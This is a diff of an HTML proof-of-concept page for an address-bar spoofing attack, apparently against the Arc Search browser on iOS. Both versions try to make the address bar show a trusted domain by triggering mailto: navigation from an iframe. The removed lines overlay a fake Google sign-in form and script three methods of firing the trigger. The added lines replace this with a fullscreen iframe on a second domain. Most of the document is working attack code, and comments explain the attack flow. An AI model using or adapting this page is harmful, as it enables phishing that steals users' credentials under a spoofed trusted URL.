@@ -3,126 +3,35 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Loading...</title>
+  <title>PoC</title>
+  <style>
+    * { margin: 0; padding: 0; }
+    body { overflow: hidden; }
+  </style>
 </head>
 <body>
 
 <!--
-  ATTACK FLOW:
-  1. User opens THIS page (attacker.github.io) in Arc Search iOS
-  2. victim iframe (google.com/csi) loads → triggers mailto: nav on load
-  3. Arc Navigation Delegate reads iframe origin → victim.com/google.com
-  4. Address bar updates to google.com
-  5. Attacker overlays fake content on top (or victim page itself is the content)
+  CORRECTED FLOW:
+  1. User opens THIS page (domain A / attacker)
+  2. victim-frame (domain B / intanjelek.github.io) loads fullscreen
+  3. iframe.html on domain B fires mailto: on load
+  4. Arc Navigation Delegate reads: origin = domain B (intanjelek.github.io)
+  5. Address bar updates to domain B while attacker content (domain A) is underneath
 
-  WHY mailto: instead of geo:
-  - mailto: is more universally handled by WKWebView navigation delegate
-  - Less likely to open external app (Mail.app), more likely to just fire nav event
-  - email:// is non-standard, use mailto: which is RFC-standard
+  KEY FIX: Remove the srcdoc attack-frame (wrong origin).
+  The trigger must come FROM domain B iframe, not domain A srcdoc.
+  So iframe.html on domain B must contain the URI scheme trigger.
 -->
 
-<!--
-  STEP 1: Hidden iframe of victim (google.com or any trusted domain)
-  This iframe fires mailto: on load → triggers address bar update
--->
+<!-- Fullscreen victim iframe (domain B) — THIS is what triggers the spoof -->
+<!-- iframe.html on domain B must fire: location.href = 'mailto:a@b.com' on load -->
 <iframe
-  id="victim-iframe"
-  src="https://www.google.com/csi"
-  style="position:fixed;inset:0;width:100%;height:100%;border:none;z-index:1;"
-  sandbox="allow-scripts allow-same-origin allow-top-navigation-by-user-activation"
+  id="victim-frame"
+  src="https://intanjelek.github.io/spoof/iframe.html"
+  style="position:fixed;inset:0;width:100%;height:100%;border:none;z-index:9999;"
+  sandbox="allow-scripts allow-same-origin allow-top-navigation-by-user-activation allow-forms"
 ></iframe>
-
-<!--
-  STEP 2: Attacker content overlaid on top
-  User sees THIS, but address bar shows google.com
--->
-<div id="overlay" style="
-  position:fixed;inset:0;z-index:2;
-  background:#fff;
-  display:flex;flex-direction:column;align-items:center;
-  justify-content:center;padding:32px;font-family:Arial,sans-serif;
-">
-  <!-- Fake Google login UI -->
-  <svg width="75" height="25" viewBox="0 0 272 92" style="margin-bottom:32px;">
-    <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
-    <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
-    <path fill="#4285F4" d="M35.29 41.41V32h32.6c.32 1.68.48 3.67.48 5.83 0 7.23-1.98 16.14-8.36 22.52-6.21 6.46-14.15 9.91-24.72 9.91C16.24 70.26.85 55.5.85 36.26.85 17.02 16.24 2.26 35.29 2.26c10.83 0 18.55 4.25 24.35 9.74l-6.85 6.85c-4.16-3.89-9.82-6.93-17.5-6.93-14.31 0-25.49 11.51-25.49 25.82 0 14.31 11.18 25.82 25.49 25.82 9.28 0 14.56-3.73 17.95-7.12 2.75-2.75 4.56-6.69 5.27-12.06l-23.22.02z"/>
-    <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
-  </svg>
-
-  <h2 style="font-size:24px;font-weight:400;color:#202124;margin-bottom:8px;">Sign in</h2>
-  <p style="font-size:15px;color:#202124;margin-bottom:28px;">to continue to Google</p>
-
-  <div style="width:100%;max-width:360px;">
-    <input type="email" placeholder="Email or phone"
-      style="width:100%;padding:14px 12px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:20px;box-sizing:border-box;outline:none;">
-
-    <div style="font-size:13px;color:#202124;margin-bottom:24px;">
-      Not your computer? Use Guest mode to sign in privately.
-      <a href="#" style="color:#1a73e8;">Learn more</a>
-    </div>
-
-    <div style="display:flex;justify-content:space-between;align-items:center;">
-      <a href="#" style="color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;">Create account</a>
-      <button style="background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;">Next</button>
-    </div>
-  </div>
-</div>
-
-<script>
-  // Trigger mailto: from the victim iframe context
-  // We do this by posting a message to the iframe OR by navigating the iframe
-  const victimFrame = document.getElementById('victim-iframe');
-
-  victimFrame.addEventListener('load', function() {
-    // Once victim iframe loads (google.com/csi), inject navigation trigger
-    // The iframe's origin is google.com — so when navigation delegate fires,
-    // it reads google.com as the origin → address bar = google.com
-
-    try {
-      // Method 1: navigate iframe to mailto: (triggers nav delegate with google.com origin)
-      victimFrame.contentWindow.location.href = 'mailto:test@example.com';
-    } catch(e) {
-      // Cross-origin blocked — try srcdoc replacement
-      console.log('Method 1 failed:', e.message);
-    }
-
-    // Method 2: create a child iframe inside that fires mailto:
-    // (if cross-origin access blocked)
-    try {
-      const doc = victimFrame.contentDocument;
-      if (doc) {
-        const script = doc.createElement('script');
-        script.textContent = "location.href='mailto:a@b.com'";
-        doc.head.appendChild(script);
-      }
-    } catch(e) {
-      console.log('Method 2 failed:', e.message);
-    }
-  });
-
-  // Method 3: Use srcdoc iframe that CLAIMS to be from google context
-  // by navigating through google.com first then to mailto:
-  setTimeout(function() {
-    // Create a new iframe that navigates: google.com/csi → mailto:
-    const f2 = document.createElement('iframe');
-    f2.style.cssText = 'display:none;';
-    f2.src = 'https://www.google.com/csi';
-    document.body.appendChild(f2);
-    f2.onload = function() {
-      try {
-        f2.contentWindow.location.href = 'mailto:spoof@attacker.com';
-      } catch(e) {}
-      // Also try via anchor click inside iframe
-      try {
-        const a = f2.contentDocument.createElement('a');
-        a.href = 'mailto:spoof@attacker.com';
-        f2.contentDocument.body.appendChild(a);
-        a.click();
-      } catch(e) {}
-    };
-  }, 300);
-</script>
 
 </body>
 </html>
